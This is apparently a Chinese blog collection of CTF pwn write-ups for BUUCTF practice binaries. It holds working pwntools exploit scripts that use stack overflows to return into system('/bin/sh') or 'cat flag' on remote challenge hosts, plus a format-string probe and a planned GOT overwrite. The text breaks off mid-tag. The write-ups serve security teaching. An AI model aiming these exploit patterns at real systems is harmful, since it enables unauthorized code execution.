class="headerlink" title="warmup_csaw_2016-1"></a>warmup_csaw_2016-1</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">~&gt;</span> <span class="hljs-string">pwn</span> <span class="hljs-string">checksec</span> <span class="hljs-string">./warmup_csaw_2016</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/philo/warmup_csaw_2016&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">disabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br>    <span class="hljs-attr">RWX:</span>      <span class="hljs-string">Has</span> <span class="hljs-string">RWX</span> <span class="hljs-string">segments</span><br></code></pre></td></tr></table></figure><p>在write函数下断点，ni运行到gets函数</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">  <span class="hljs-number">0x400692</span>    <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span> - <span class="hljs-number">0x40</span>] # offset<br>  <span class="hljs-number">0x400696</span>    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rax</span><br>  <span class="hljs-number">0x400699</span>    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br>► <span class="hljs-number">0x40069e</span>    <span class="hljs-keyword">call</span>   gets@plt                      &lt;gets@plt&gt;<br></code></pre></td></tr></table></figure><p>看一下堆栈状态</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"> <span class="hljs-built_in">RBP</span>  <span class="hljs-number">0x7fffffffe1c0</span> ◂— <span class="hljs-number">0x0</span><br> <span class="hljs-built_in">RSP</span>  <span class="hljs-number">0x7fffffffe140</span> ◂— <span class="hljs-string">&#x27;0x40060d\n&#x27;</span><br>*<span class="hljs-built_in">RIP</span>  <span class="hljs-number">0x40069e</span> ◂— <span class="hljs-keyword">call</span> <span class="hljs-number">0x400500</span><br></code></pre></td></tr></table></figure><p>观察到代码段内容：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040060D</span> sub_40060D      proc <span class="hljs-built_in">near</span>               <span class="hljs-comment">; DATA XREF: main+34↓o</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040060D</span> <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">000000000040060D</span>                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span>000000000040060E                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400611</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>, offset command <span class="hljs-comment">; &quot;cat flag.txt&quot;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000400616</span>                 <span class="hljs-keyword">call</span>    _system<br><span class="hljs-symbol">.text:</span>000000000040061B                 <span class="hljs-keyword">pop</span>     <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span>000000000040061C                 <span class="hljs-keyword">retn</span><br><span class="hljs-symbol">.text:</span>000000000040061C <span class="hljs-comment">; &#125; // starts at 40060D</span><br></code></pre></td></tr></table></figure><p>得到返回地址0x0000000000400611</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><span class="hljs-comment">#context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><br>sh = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27704</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x40</span>+<span class="hljs-number">8</span>) + p64(<span class="hljs-number">0x0000000000400611</span>)<br><br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">pwn</span> <span class="hljs-string">checksec</span> <span class="hljs-string">ciscn_2019_n_1</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/philo/ciscn_2019_n_1&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br></code></pre></td></tr></table></figure><p>看一下func函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">char</span> v1[<span class="hljs-number">44</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br>  <span class="hljs-keyword">float</span> v2; <span class="hljs-comment">// [rsp+2Ch] [rbp-4h]</span><br><br>  v2 = <span class="hljs-number">0.0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Let&#x27;s guess the number.&quot;</span>);<br>  gets(v1);<br>  <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">11.28125</span> )<br>    result = system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    result = <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Its value should be 11.28125&quot;</span>);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>直接跳到cat /flag代码处即可</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004006</span>BE                 <span class="hljs-keyword">mov</span>     edi, offset command <span class="hljs-comment">; &quot;cat /flag&quot;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004006</span>C3                 <span class="hljs-keyword">mov</span>     eax, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00000000004006</span>C8                 <span class="hljs-keyword">call</span>    _system<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><span class="hljs-comment">#context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><br>sh = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">26563</span>)<br><br>target = <span class="hljs-number">0x00000000004006BE</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x30</span>+<span class="hljs-number">8</span>) + p64(target)<br><br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"> <span class="hljs-string">~&gt;</span> <span class="hljs-string">pwn</span> <span class="hljs-string">checksec</span> <span class="hljs-string">pwn1_sctf_2016</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/philo/pwn1_sctf_2016&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">vuln</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-3Ch] BYREF</span><br>  <span class="hljs-keyword">char</span> v3[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+3Ch] [ebp-1Ch] BYREF</span><br>  <span class="hljs-keyword">char</span> v4[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [esp+40h] [ebp-18h] BYREF</span><br>  <span class="hljs-keyword">char</span> v5; <span class="hljs-comment">// [esp+47h] [ebp-11h] BYREF</span><br>  <span class="hljs-keyword">char</span> v6[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [esp+48h] [ebp-10h] BYREF</span><br>  <span class="hljs-keyword">char</span> v7[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [esp+4Fh] [ebp-9h] BYREF</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tell me something about yourself: &quot;</span>);<br>  <span class="hljs-built_in">fgets</span>(s, <span class="hljs-number">32</span>, edata);<br>  std::string::<span class="hljs-keyword">operator</span>=(&amp;input, s);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::<span class="hljs-built_in">allocator</span>(&amp;v5);<br>  std::string::<span class="hljs-built_in">string</span>(v4, <span class="hljs-string">&quot;you&quot;</span>, &amp;v5);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::<span class="hljs-built_in">allocator</span>(v7);<br>  std::string::<span class="hljs-built_in">string</span>(v6, <span class="hljs-string">&quot;I&quot;</span>, v7);<br>  <span class="hljs-built_in">replace</span>((std::string *)v3);<br>  std::string::<span class="hljs-keyword">operator</span>=(&amp;input, v3, v6, v4); <span class="hljs-comment">// 关注这一行</span><br>  std::string::~<span class="hljs-built_in">string</span>(v3);<br>  std::string::~<span class="hljs-built_in">string</span>(v6);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(v7);<br>  std::string::~<span class="hljs-built_in">string</span>(v4);<br>  std::allocator&lt;<span class="hljs-keyword">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(&amp;v5);<br>  v0 = (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)std::string::<span class="hljs-built_in">c_str</span>((std::string *)&amp;input);<br>  <span class="hljs-built_in">strcpy</span>(s, v0);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;So, %s\n&quot;</span>, s);<br>&#125;<br></code></pre></td></tr></table></figure><p>C++逆出来的确实看不懂，大概就是你输入的字符串中的I会被you替换，然后把处理后的字符串strcpy给s</p><p>所以很明显字符串变长了，虽然fgets指定了字符数量，但是由于这个替换的存在，有可能冲掉返回地址</p><p>s在栈上的位置是ebp-3Ch，因此偏移为0x3c+4=64字节，我们输入21个I，可以得到63字节</p><p>看一下返回地址</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">.<span class="hljs-keyword">text</span>:<span class="hljs-number">08048</span>F13                 mov     dword ptr [esp], <span class="hljs-built_in">offset</span> <span class="hljs-keyword">command</span> ; <span class="hljs-string">&quot;cat flag.txt&quot;</span><br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">08048</span>F1A                 call    <span class="hljs-title">_system</span><br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs clean">#!/usr/bin/python3<br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>#context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>#context.terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>sh = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">29753</span>)<br><br>target = <span class="hljs-number">0x08048F13</span><br><br>payload = b<span class="hljs-string">&#x27;I&#x27;</span> * (<span class="hljs-number">21</span>) + b<span class="hljs-string">&#x27;a&#x27;</span> + p32(target)<br><br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h1> <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">&gt;</span> <span class="hljs-string">pwn</span> <span class="hljs-string">checksec</span> <span class="hljs-string">level0</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/philo/level0&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br></code></pre></td></tr></table></figure><p>看一下代码段</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">.<span class="hljs-keyword">text</span>:<span class="hljs-number">000000000040059</span>A                 mov     edi, <span class="hljs-built_in">offset</span> <span class="hljs-keyword">command</span> ; <span class="hljs-string">&quot;/bin/sh&quot;</span><br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">000000000040059</span>F                 call    <span class="hljs-title">_system</span><br></code></pre></td></tr></table></figure><p>看堆栈算一下偏移</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"> <span class="hljs-built_in">RBP</span>  <span class="hljs-number">0x7fffffffe1b0</span> —▸ <span class="hljs-number">0x7fffffffe1d0</span> ◂— <span class="hljs-number">0x0</span><br> <span class="hljs-built_in">RSP</span>  <span class="hljs-number">0x7fffffffe130</span> ◂— <span class="hljs-number">0x0</span><br>*<span class="hljs-built_in">RIP</span>  <span class="hljs-number">0x4005bf</span> (vulnerable_function+<span class="hljs-number">25</span>) ◂— <span class="hljs-keyword">call</span> <span class="hljs-number">0x400470</span><br>───────────────────────────────────────────────────────────────────[ DISASM / x86-<span class="hljs-number">64</span> / set emulate on ]────────────────────────────────────────────────────────────────────<br>   <span class="hljs-number">0x4005aa</span> &lt;vulnerable_function+<span class="hljs-number">4</span>&gt;     <span class="hljs-keyword">add</span>    <span class="hljs-built_in">rsp</span>, -<span class="hljs-number">0x80</span><br>   <span class="hljs-number">0x4005ae</span> &lt;vulnerable_function+<span class="hljs-number">8</span>&gt;     <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span> - <span class="hljs-number">0x80</span>]<br>   <span class="hljs-number">0x4005b2</span> &lt;vulnerable_function+<span class="hljs-number">12</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edx</span>, <span class="hljs-number">0x200</span><br>   <span class="hljs-number">0x4005b7</span> &lt;vulnerable_function+<span class="hljs-number">17</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span><br>   <span class="hljs-number">0x4005ba</span> &lt;vulnerable_function+<span class="hljs-number">20</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edi</span>, <span class="hljs-number">0</span><br> ► <span class="hljs-number">0x4005bf</span> &lt;vulnerable_function+<span class="hljs-number">25</span>&gt;    <span class="hljs-keyword">call</span>   read@plt                      &lt;read@plt&gt;<br><span class="hljs-symbol">        fd:</span> <span class="hljs-number">0x0</span> (/dev/pts/<span class="hljs-number">1</span>)<br><span class="hljs-symbol">        buf:</span> <span class="hljs-number">0x7fffffffe130</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-symbol">        nbytes:</span> <span class="hljs-number">0x200</span><br><br>   <span class="hljs-number">0x4005c4</span> &lt;vulnerable_function+<span class="hljs-number">30</span>&gt;    <span class="hljs-keyword">leave</span><br>   <span class="hljs-number">0x4005c5</span> &lt;vulnerable_function+<span class="hljs-number">31</span>&gt;    <span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure><p>填充0x80+8个字节即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br><span class="hljs-comment">#context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><br>sh = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">26852</span>)<br><span class="hljs-comment"># sh = process(&#x27;./pwn&#x27;)</span><br>target = <span class="hljs-number">0x000000000040059A</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x80</span>+<span class="hljs-number">8</span>) + p64(target)<br><br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="第五空间2019-决赛-PWN5-1"><a href="#第五空间2019-决赛-PWN5-1" class="headerlink" title="[第五空间2019 决赛]PWN5-1"></a>[第五空间2019 决赛]PWN5-1</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">&gt;</span> <span class="hljs-string">pwn</span> <span class="hljs-string">checksec</span> <span class="hljs-string">./pwn</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/philo/pwn&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br></code></pre></td></tr></table></figure><p>看一下程序逻辑，由于read读取99，而buf是100，因此无法进行缓冲区溢出</p><p>再往下看，考虑格式化字符串漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">char</span> buf[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+14h] [ebp-70h] BYREF </span><br><br>srand(v1);<br>fd = open(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, <span class="hljs-number">0</span>);<br>read(fd, &amp;dword_804C044, <span class="hljs-number">4u</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;your name:&quot;</span>);<br>read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x63</span>u);<span class="hljs-comment">//读入99</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello,&quot;</span>);<br><span class="hljs-built_in">printf</span>(buf);<span class="hljs-comment">//存在格式化字符串漏洞</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;your passwd:&quot;</span>);<br>read(<span class="hljs-number">0</span>, nptr, <span class="hljs-number">0xF</span>u);<br><span class="hljs-keyword">if</span> ( atoi(nptr) == dword_804C044 )<br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;ok!!&quot;</span>);<br>  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;fail&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>程序逻辑：</p><ul><li>使用srand函数初始化随机数生成器；</li><li>打开/dev/urandom设备，并从中读取4个字节，存入dword_804C044变量；</li><li>提示用户输入用户名，使用read函数从标准输入（文件描述符为0）中读取不超过99个字节的数据存入buf数组中；</li><li>输出“Hello, ”以及用户输入的用户名，<strong>注意此处存在格式化字符串漏洞</strong></li><li>提示用户输入密码，使用read函数从标准输入中读取不超过15个字节的数据存入nptr数组中；</li><li>将nptr数组中的字符串转换为整数类型，如果和步骤2中读取的dword_804C044相等，则输出“ok!!”，并调用system函数打开一个shell；</li><li>如果两者不相等，则输出“fail”。</li><li>读取你的名字和密码，如何和dword_804C044相同，那么就得到/bin/sh</li></ul><h2 id="思路1：覆盖got表"><a href="#思路1：覆盖got表" class="headerlink" title="思路1：覆盖got表"></a>思路1：覆盖got表</h2><p>计算一下偏移为10</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xquery">~$ ./pwn-buu<br>your<span class="hljs-built_in"> name</span>:AAAA<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<span class="hljs-meta">%x</span>.<br>Hello,AAAAfffae618.<span class="hljs-number">63.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>.f7f4799<span class="hljs-number">0</span>.f7f359f9.<span class="hljs-number">8048034</span>.b.<span class="hljs-number">41414141</span><br></code></pre></td></tr></table></figure><p>我们可以将后续会被调用的atoi函数的地址改写为我们的目标地址，这样当调用atoi函数的时候，实际执行的就是我们想要执行的代码</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>0804932F                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">eax</span>, (aBinSh - <span class="hljs-number">804C000h</span>)[<span class="hljs-built_in">ebx</span>] <span class="hljs-comment">; &quot;/bin/sh&quot;</span><br><span 